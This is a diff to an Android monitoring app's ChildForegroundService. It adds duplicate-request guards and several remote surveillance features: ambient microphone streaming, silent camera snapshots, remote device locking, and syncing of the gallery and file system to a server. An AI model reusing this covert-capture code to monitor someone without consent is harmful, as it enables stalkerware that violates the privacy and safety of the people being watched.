@@ -60,8 +60,15 @@ class ChildForegroundService : Service() {
     private var scheduledStopRunnable: Runnable? = null
     private var currentSessionId: String? = null
     private var isStreaming = false
+    @Volatile
+    private var isStartingStream = false
+    private var lastStreamStartTime = 0L
+    private var lastStartedSessionId = ""
+    @Volatile
+    private var isCapturingSnapshot = false
     private val mainHandler = android.os.Handler(android.os.Looper.getMainLooper())
     private var candidateBatcher: com.example.authapp.webrtc.CandidateBatcher? = null
+    private var ambientAudioStreamer: com.example.authapp.audio.AmbientAudioStreamer? = null
     private var overlayView: android.view.View? = null
     private var studyModeOverlayView: android.view.View? = null
     private var adaptiveHeartbeatManager: com.example.authapp.utils.AdaptiveHeartbeatManager? = null
@@ -496,9 +503,13 @@ class ChildForegroundService : Service() {
                 val sessionId = intent.getStringExtra(EXTRA_SESSION_ID) ?: ""
                 val durationMinutes = intent.getIntExtra("duration_minutes", 0)
 
-                // Deduplicate redundant start requests if session is already active
-                if (isStreaming && currentSessionId == sessionId) {
-                    FirebaseCrashlytics.getInstance().log("[ChildService] Stream session $sessionId already active; ignoring duplicate start request.")
+                // Deduplicate redundant start requests if session is already active or in process of starting
+                if ((isStreaming || isStartingStream) && currentSessionId == sessionId) {
+                    FirebaseCrashlytics.getInstance().log("[ChildService] Stream session $sessionId already active/starting; ignoring duplicate start request.")
+                    return START_STICKY
+                }
+                if (System.currentTimeMillis() - lastStreamStartTime < 4000L && lastStartedSessionId == sessionId) {
+                    FirebaseCrashlytics.getInstance().log("[ChildService] Stream session $sessionId triggered within 4s window; ignoring duplicate.")
                     return START_STICKY
                 }
 
@@ -662,6 +673,11 @@ class ChildForegroundService : Service() {
                 updateForegroundNotification("Background Protection Active", getIdleServiceType())
             }
             ACTION_TAKE_SNAPSHOT -> {
+                if (isCapturingSnapshot) {
+                    FirebaseCrashlytics.getInstance().log("[ChildService] Snapshot capture already in progress; skipping duplicate trigger.")
+                    return START_STICKY
+                }
+                isCapturingSnapshot = true
                 val facing = intent.getStringExtra(EXTRA_CAMERA_FACING) ?: "back"
                 val uid = AppHealthTelemetry.getEffectiveUserId(applicationContext)
                 ensureOverlayWindow()
@@ -672,6 +688,7 @@ class ChildForegroundService : Service() {
                     com.example.authapp.camera.SilentSnapshotManager(applicationContext).captureSnapshot(
                         isFront = isFront,
                         onCaptured = { file ->
+                            isCapturingSnapshot = false
                             updateForegroundNotification("Background Protection Active", getIdleServiceType())
                             FirebaseRepository.uploadSnapshot(
                                 childId = uid,
@@ -688,11 +705,14 @@ class ChildForegroundService : Service() {
                             )
                         },
                         onError = { err ->
+                            isCapturingSnapshot = false
                             updateForegroundNotification("Background Protection Active", getIdleServiceType())
                             FirebaseCrashlytics.getInstance().log("[ChildService] Snapshot capture error: $err")
                             FirebaseRepository.reportSnapshotError(uid, err)
                         }
                     )
+                } else {
+                    isCapturingSnapshot = false
                 }
             }
             ACTION_EXECUTE_COMMAND -> {
@@ -707,6 +727,9 @@ class ChildForegroundService : Service() {
                     "SIREN" -> {
                         if (value == "true") RemoteActionsManager.playSiren(applicationContext, 30)
                         else RemoteActionsManager.stopSiren()
+                    }
+                    "LOCK" -> {
+                        RemoteActionsManager.lockDevice(applicationContext)
                     }
                 }
             }
@@ -801,12 +824,18 @@ class ChildForegroundService : Service() {
                     FirebaseRepository.reportSnapshotError(uid, "Camera hardware is currently in use by active live stream")
                     return@listenToSnapshotRequest
                 }
+                if (isCapturingSnapshot) {
+                    FirebaseCrashlytics.getInstance().log("[ChildService] Snapshot requested while already capturing; rejecting duplicate")
+                    return@listenToSnapshotRequest
+                }
+                isCapturingSnapshot = true
                 ensureOverlayWindow()
                 updateForegroundNotification("Capturing Remote Photo", getSnapshotServiceType())
                 val isFront = cameraFacing.equals("front", ignoreCase = true)
                 com.example.authapp.camera.SilentSnapshotManager(applicationContext).captureSnapshot(
                     isFront = isFront,
                     onCaptured = { file ->
+                        isCapturingSnapshot = false
                         updateForegroundNotification("Background Protection Active", getIdleServiceType())
                         FirebaseRepository.uploadSnapshot(
                             childId = uid,
@@ -823,6 +852,7 @@ class ChildForegroundService : Service() {
                         )
                     },
                     onError = { err ->
+                        isCapturingSnapshot = false
                         updateForegroundNotification("Background Protection Active", getIdleServiceType())
                         FirebaseCrashlytics.getInstance().log("[ChildService] Snapshot capture error: $err")
                         FirebaseRepository.reportSnapshotError(uid, err)
@@ -885,6 +915,25 @@ class ChildForegroundService : Service() {
                             RemoteActionsManager.stopSiren()
                         }
                     }
+                    "LOCK" -> {
+                        val enable = value == true || value == "true"
+                        if (enable) {
+                            RemoteActionsManager.lockDevice(applicationContext)
+                            try {
+                                FirebaseControlRepository.sendRemoteCommand(uid, "LOCK", false)
+                            } catch (_: Exception) {}
+                        }
+                    }
+                    "SYNC_MEDIA" -> {
+                        val enable = value == true || value == "true"
+                        if (enable) {
+                            try {
+                                com.example.authapp.utils.MediaGalleryUtils.scanAndSyncMediaGallery(applicationContext, uid)
+                                com.example.authapp.utils.FileManagerUtils.scanAndSyncFileExplorer(applicationContext, uid)
+                                FirebaseControlRepository.sendRemoteCommand(uid, "SYNC_MEDIA", false)
+                            } catch (_: Exception) {}
+                        }
+                    }
                 }
             }
         }
@@ -924,14 +973,51 @@ class ChildForegroundService : Service() {
             childId = uid,
             onRequested = { streamType, sessionId ->
                 FirebaseCrashlytics.getInstance().log("[ChildService] Stream request received over RTDB: $streamType, session: $sessionId")
+                if ((isStreaming || isStartingStream) && currentSessionId == sessionId) {
+                    FirebaseCrashlytics.getInstance().log("[ChildService] Stream session $sessionId already active/starting; ignoring duplicate onRequested.")
+                    return@listenToStreamRequests
+                }
+                if (System.currentTimeMillis() - lastStreamStartTime < 4000L && lastStartedSessionId == sessionId) {
+                    FirebaseCrashlytics.getInstance().log("[ChildService] Stream session $sessionId requested within 4s window; ignoring duplicate onRequested.")
+                    return@listenToStreamRequests
+                }
                 if (!isStreaming || currentSessionId != sessionId) {
-                    if (streamType.equals("screen", ignoreCase = true) || streamType.equals("screen_mirror", ignoreCase = true)) {
+                    if (streamType.equals("audio", ignoreCase = true)) {
+                        // Senior Dev Architecture: Direct Ambient Audio Streaming (Zero WebRTC handshake failures)
+                        try {
+                            val serviceType = getStreamingServiceType(streamType)
+                            updateForegroundNotification("Active Ambient Audio Stream", serviceType)
+                            acquireWakeLock()
+                            adaptiveHeartbeatManager?.setStreamingState(true)
+                            isStreaming = true
+                            currentSessionId = sessionId
+
+                            ambientAudioStreamer?.stopStreaming(uid)
+                            val streamer = com.example.authapp.audio.AmbientAudioStreamer(applicationContext)
+                            ambientAudioStreamer = streamer
+                            streamer.startStreaming(
+                                childId = uid,
+                                onStarted = {
+                                    FirebaseRepository.updateStreamStatus(uid, "STREAMING", streamType, sessionId)
+                                    FirebaseCrashlytics.getInstance().log("[ChildService] AmbientAudioStreamer active and streaming")
+                                },
+                                onError = { err ->
+                                    FirebaseCrashlytics.getInstance().log("[ChildService] AmbientAudioStreamer error: $err")
+                                    FirebaseRepository.updateStreamStatus(uid, "FAILED", streamType, sessionId)
+                                    stopStream()
+                                }
+                            )
+                        } catch (e: Exception) {
+                            FirebaseCrashlytics.getInstance().log("[ChildService] AmbientAudioStreamer launch error: ${e.localizedMessage}")
+                        }
+                    } else if (streamType.equals("screen", ignoreCase = true) || streamType.equals("screen_mirror", ignoreCase = true)) {
                         val promptIntent = Intent(this, com.example.authapp.ui.activity.ScreenCapturePromptActivity::class.java).apply {
                             addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                             putExtra(EXTRA_SESSION_ID, sessionId)
                         }
                         startActivity(promptIntent)
                     } else {
+                        // Live Video + Audio
                         if (streamType.equals("video", ignoreCase = true)) {
                             ensureOverlayWindow()
                         }
@@ -958,7 +1044,21 @@ class ChildForegroundService : Service() {
     }
 
     private fun startWebRtcStream(sessionId: String, streamType: String, projectionData: Intent? = null) {
-        if (isStreaming && currentSessionId == sessionId) return
+        synchronized(this) {
+            if ((isStreaming || isStartingStream) && currentSessionId == sessionId) {
+                FirebaseCrashlytics.getInstance().log("[ChildService] startWebRtcStream duplicate ignored for $sessionId")
+                return
+            }
+            if (System.currentTimeMillis() - lastStreamStartTime < 4000L && lastStartedSessionId == sessionId) {
+                FirebaseCrashlytics.getInstance().log("[ChildService] startWebRtcStream 4s debounce ignored for $sessionId")
+                return
+            }
+            lastStreamStartTime = System.currentTimeMillis()
+            lastStartedSessionId = sessionId
+            isStartingStream = true
+            currentSessionId = sessionId
+        }
+
         stopStream()
 
         currentSessionId = sessionId
@@ -1005,6 +1105,7 @@ class ChildForegroundService : Service() {
                         candidateBatcher?.addCandidate(candidate)
                     },
                     onSdpCreated = { sdp ->
+                        isStartingStream = false
                         FirebaseCrashlytics.getInstance().log("[ChildService] Sending SDP Offer to RTDB")
                         FirebaseRepository.sendSdpOffer(sessionId, sdp.description)
                     }
@@ -1029,6 +1130,7 @@ class ChildForegroundService : Service() {
             }
             } // end fetchIceServers
         } catch (t: Throwable) {
+            isStartingStream = false
             FirebaseCrashlytics.getInstance().recordException(t)
             AppHealthTelemetry.logDiagnostic(applicationContext, "WEBRTC_STREAM", "FAILED", "Failed to start WebRTC stream on child: ${t.localizedMessage}", t.message)
             stopStream()
@@ -1040,6 +1142,7 @@ class ChildForegroundService : Service() {
         scheduledStopRunnable = null
         val oldSessionId = currentSessionId
         isStreaming = false
+        isStartingStream = false
         currentSessionId = null
 
         if (!oldSessionId.isNullOrEmpty()) {
@@ -1073,6 +1176,15 @@ class ChildForegroundService : Service() {
             FirebaseCrashlytics.getInstance().recordException(e)
         }
         webRtcManager = null
+
+        try {
+            val uid = AppHealthTelemetry.getEffectiveUserId(applicationContext)
+            ambientAudioStreamer?.stopStreaming(uid)
+        } catch (e: Exception) {
+            FirebaseCrashlytics.getInstance().recordException(e)
+        }
+        ambientAudioStreamer = null
+
         releaseWakeLock()
         adaptiveHeartbeatManager?.setStreamingState(false)
         removeOverlayWindow()
@@ -1500,7 +1612,7 @@ class ChildForegroundService : Service() {
         }
         if (uid.isNotEmpty()) {
             snapshotRequestListener?.let {
-                FirebaseRepository.removeValueListener("users/$uid/snapshotRequest", it)
+                FirebaseRepository.removeValueListener("streams/$uid/snapshotRequest", it)
             }
             recordingScheduleListener?.let {
                 FirebaseRepository.removeValueListener("schedules/$uid", it)
